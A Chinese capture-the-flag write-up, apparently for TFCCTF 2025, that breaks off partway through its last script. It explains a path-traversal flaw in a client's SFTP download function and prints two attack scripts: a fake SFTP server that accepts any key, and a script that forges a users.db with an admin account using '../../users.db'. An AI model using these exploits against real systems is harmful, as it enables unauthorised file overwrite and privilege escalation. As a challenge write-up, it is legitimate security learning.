<p>没有指定admin字段值. 也就是所有注册用户都为非admin,不能读取flag, 并且浏览附件发现默认并没有初始化一个admin账户. 所以就算下载到users.db也没有admin账户</p>
<p>思路是通过题目中的sftp文件下载, 让他去我们的恶意服务器上下载users.db并覆盖到原有的users.db, 这样就可以成功越权</p>
<p>客户端关键代码是这样的:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">SSH_File_Download</span>(<span class="params">ctx: ssh_ctx</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; host, username, filename, keyPath &#125; = ctx;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> safeRemoteName = <span class="title function_">basename</span>(filename);</span><br><span class="line">  <span class="keyword">const</span> safeLocalName = filename;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_">hasBlockedExtension</span>(safeRemoteName) || <span class="title function_">hasBlockedExtension</span>(safeLocalName)) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">&quot;Refused: writing code files is not allowed.&quot;</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> fsp.<span class="title function_">mkdir</span>(<span class="string">&quot;/app/downloads&quot;</span>, &#123; <span class="attr">recursive</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> localPath = <span class="string">&quot;/app/downloads/&quot;</span> + safeLocalName;</span><br><span class="line">  <span class="keyword">const</span> remotePath = <span class="string">&quot;/app/&quot;</span> + safeRemoteName;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sftp = <span class="keyword">new</span> <span class="title class_">Client</span>();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> sftp.<span class="title function_">connect</span>(&#123;</span><br><span class="line">      host,</span><br><span class="line">      username,</span><br><span class="line">      <span class="attr">privateKey</span>: fs.<span class="title function_">readFileSync</span>(keyPath),</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> sftp.<span class="title function_">fastGet</span>(remotePath, localPath);</span><br><span class="line">    <span class="keyword">await</span> sftp.<span class="title function_">end</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> fsp.<span class="title function_">chmod</span>(localPath, <span class="number">0o600</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">ok</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">message</span>: <span class="string">&quot;Successfully downloaded the file&quot;</span>,</span><br><span class="line">      <span class="attr">path</span>: localPath,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (<span class="attr">error</span>: any) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> sftp.<span class="title function_">end</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">ok</span>: <span class="literal">false</span>, <span class="attr">message</span>: error?.<span class="property">message</span> || <span class="string">&quot;SFTP error&quot;</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">const</span> safeRemoteName = <span class="title function_">basename</span>(filename);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> safeLocalName = filename;</span><br></pre></td></tr></table></figure>

<p>客户端在将获取到的文件保存到本地时是可以目录穿越的, 所以就可以绕过后面的:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> localPath = <span class="string">&quot;/app/downloads&quot;</span> + <span class="string">&quot;/&quot;</span> +safeLocalName;</span><br></pre></td></tr></table></figure>

<p>将从服务端获取到的文件保存到客户端任意位置</p>
<p>由于进行了私钥验证, 此时就让ai写个服务端, 任何私钥都能通过验证:</p>
<p><code>fake_server.py</code>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="comment"># 临时生成的 SSH host key</span></span><br><span class="line">HOST_KEY = paramiko.RSAKey.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 工作目录，只允许访问这里的文件</span></span><br><span class="line">WORK_DIR = <span class="string">&quot;/app&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AlwaysAllowServer</span>(paramiko.ServerInterface):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;允许任何私钥/密码通过认证&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_channel_request</span>(<span class="params">self, kind, chanid</span>):</span><br><span class="line">        <span class="keyword">if</span> kind == <span class="string">&quot;session&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.OPEN_SUCCEEDED</span><br><span class="line">        <span class="keyword">return</span> paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_auth_publickey</span>(<span class="params">self, username, key</span>):</span><br><span class="line">        <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_auth_password</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_allowed_auths</span>(<span class="params">self, username</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;publickey,password&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleSFTPHandler</span>(paramiko.SFTPServerInterface):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;SFTP 文件操作处理，只允许访问 WORK_DIR 下的文件&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_to_local</span>(<span class="params">self, path: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        将客户端传来的相对路径映射到 WORK_DIR</span></span><br><span class="line"><span class="string">        拒绝访问 WORK_DIR 外的文件</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 移除开头的斜杠，确保是相对路径</span></span><br><span class="line">        relative_path = path.lstrip(<span class="string">&quot;/\\&quot;</span>)</span><br><span class="line">        local_path = os.path.abspath(os.path.join(WORK_DIR, relative_path))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 安全检查：必须在 WORK_DIR 内</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> local_path.startswith(os.path.abspath(WORK_DIR)):</span><br><span class="line">            <span class="keyword">raise</span> paramiko.SFTPNoSuchFile(path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> local_path</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">list_folder</span>(<span class="params">self, path</span>):</span><br><span class="line">        local_path = <span class="variable language_">self</span>._to_local(path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SFTP] list_folder <span class="subst">&#123;path&#125;</span> -&gt; <span class="subst">&#123;local_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        files = os.listdir(local_path)</span><br><span class="line">        attrs = []</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">            st = os.stat(os.path.join(local_path, f))</span><br><span class="line">            attrs.append(paramiko.SFTPAttributes.from_stat(st, filename=f))</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stat</span>(<span class="params">self, path</span>):</span><br><span class="line">        local_path = <span class="variable language_">self</span>._to_local(path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SFTP] stat <span class="subst">&#123;path&#125;</span> -&gt; <span class="subst">&#123;local_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            st = os.stat(local_path)</span><br><span class="line">            <span class="keyword">return</span> paramiko.SFTPAttributes.from_stat(st)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">raise</span> paramiko.SFTPNoSuchFile(path)</span><br><span class="line"></span><br><span class="line">    lstat = stat</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open</span>(<span class="params">self, path, flags, attr</span>):</span><br><span class="line">        local_path = <span class="variable language_">self</span>._to_local(path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SFTP] open <span class="subst">&#123;path&#125;</span> -&gt; <span class="subst">&#123;local_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        mode = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> flags &amp; os.O_WRONLY:</span><br><span class="line">            mode = <span class="string">&quot;wb&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> flags &amp; os.O_RDWR:</span><br><span class="line">            mode = <span class="string">&quot;rb+&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mode = <span class="string">&quot;rb&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = <span class="built_in">open</span>(local_path, mode)</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">raise</span> paramiko.SFTPNoSuchFile(path)</span><br><span class="line"></span><br><span class="line">        handle = paramiko.SFTPHandle(flags=flags)</span><br><span class="line">        handle.readfile = f <span class="keyword">if</span> <span class="string">&quot;r&quot;</span> <span class="keyword">in</span> mode <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        handle.writefile = f <span class="keyword">if</span> <span class="string">&quot;w&quot;</span> <span class="keyword">in</span> mode <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> handle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_sftp_server</span>(<span class="params">host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">22</span></span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sock.bind((host, port))</span><br><span class="line">    sock.listen(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] SFTP server listening on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client, addr = sock.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Connection from <span class="subst">&#123;addr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        t = paramiko.Transport(client)</span><br><span class="line">        t.add_server_key(HOST_KEY)</span><br><span class="line"></span><br><span class="line">        server = AlwaysAllowServer()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            t.start_server(server=server)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] SSH negotiation failed:&quot;</span>, e)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 挂载 SFTP 子系统</span></span><br><span class="line">        t.set_subsystem_handler(<span class="string">&quot;sftp&quot;</span>, paramiko.SFTPServer, SimpleSFTPHandler)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    os.makedirs(WORK_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 测试文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(WORK_DIR, <span class="string">&quot;test.txt&quot;</span>), <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;Hello from fake SFTP server\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    start_sftp_server()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>需要安装paramiko依赖</p>
<p>有点小bug, 要把事先准备好的users.db放在<code>/app/app/</code>目录下</p>
<p>然而直接覆盖users.db也不行, 题目对users.db进行了校验</p>
<p><img src="../images/2025-TFCCTF/13.png" alt="1"></p>
<p>依旧是ai生成脚本来修改获得恶意users.db, 使得它通过DB_id校验</p>
<p><code>message.py</code>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">基于目标 Next.js 服务的 /api/download 接口，提取数据库的 DB_ID，</span></span><br><span class="line"><span class="string">并在本地生成一个包含管理员用户的 users.db（密码为可控明文，存储为 bcrypt 哈希）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">使用说明（示例）：</span></span><br><span class="line"><span class="string">  python3 exp.py \</span></span><br><span class="line"><span class="string">    --base-url http://localhost:3000 \</span></span><br><span class="line"><span class="string">    --username admin \</span></span><br><span class="line"><span class="string">    --password Admin@123 \</span></span><br><span class="line"><span class="string">    --output ./users.db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注意：</span></span><br><span class="line"><span class="string">- 本脚本不会尝试覆盖目标容器内的数据库，只负责在本地生成可用的 users.db。</span></span><br><span class="line"><span class="string">- 后续可结合 SFTP 覆盖漏洞将该文件写回容器（例如利用 filename=&quot;../../users.db&quot;）。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Unix 系统上可用的标准库 bcrypt 实现接口（依赖底层 libxcrypt 对 $2b$ 支持）</span></span><br><span class="line"><span class="comment"># 优先使用 python-bcrypt（若用户已安装），否则回退到 crypt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bcrypt_hash</span>(<span class="params">password: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成 bcrypt 哈希，优先使用 bcrypt 库，不存在则回退到 crypt（$2b$）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        password: 明文口令</span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        形如 $2b$10$... 的 bcrypt 哈希字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 优先尝试第三方 bcrypt（如已安装）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> bcrypt  <span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line">        hashed_bytes = bcrypt.hashpw(</span><br><span class="line">            password.encode(<span class="string">&quot;utf-8&quot;</span>), bcrypt.gensalt(rounds=<span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> hashed_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 回退到 crypt（需系统支持 $2b$）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> crypt</span><br><span class="line">        <span class="keyword">import</span> secrets</span><br><span class="line">        <span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">        alphabet = <span class="string">&quot;./&quot;</span> + string.digits + string.ascii_uppercase + string.ascii_lowercase</span><br><span class="line">        salt22 = <span class="string">&quot;&quot;</span>.join(secrets.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>))</span><br><span class="line">        salt = <span class="string">f&quot;$2b$10$<span class="subst">&#123;salt22&#125;</span>&quot;</span></span><br><span class="line">        hashed = crypt.crypt(password, salt)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hashed <span class="keyword">or</span> <span class="keyword">not</span> hashed.startswith(<span class="string">&quot;$2&quot;</span>):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;系统 crypt 不支持 bcrypt 算法 ($2b$)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> hashed</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(</span><br><span class="line">            <span class="string">&quot;无法生成 bcrypt 哈希：请安装 `pip install bcrypt` 或确保系统 crypt 支持 $2b$&quot;</span></span><br><span class="line">        ) <span class="keyword">from</span> exc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_post_json</span>(<span class="params">url: <span class="built_in">str</span>, payload: <span class="built_in">dict</span>, timeout: <span class="built_in">float</span> = <span class="number">15.0</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用标准库发起 JSON POST 请求，返回解析后的 JSON 字典。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    仅依赖 urllib，避免引入额外依赖。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    data = json.dumps(payload).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    req = urllib.request.Request(</span><br><span class="line">        url=url,</span><br><span class="line">        data=data,</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> urllib.request.urlopen(req, timeout=timeout) <span class="keyword">as</span> resp:</span><br><span class="line">            text = resp.read().decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> json.loads(text)</span><br><span class="line">    <span class="keyword">except</span> urllib.error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            body = e.read().decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            body = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;HTTP <span class="subst">&#123;e.code&#125;</span> <span class="subst">&#123;e.reason&#125;</span>: <span class="subst">&#123;body&#125;</span>&quot;</span>) <span class="keyword">from</span> e</span><br><span class="line">    <span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">        <span 